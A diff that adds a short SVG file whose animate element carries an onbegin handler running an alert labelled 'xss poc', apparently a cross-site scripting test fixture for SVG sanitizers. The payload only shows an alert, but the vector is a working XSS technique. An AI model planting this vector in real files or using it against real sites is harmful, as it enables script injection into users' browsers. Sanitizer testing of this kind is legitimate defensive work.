@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <defs>
+    <g id="x">
+      <animate onbegin="alert('xss poc')" attributeName="x" from="0" to="1" dur="1s" begin="0s"/>
+    </g>
+  </defs>
+</svg>
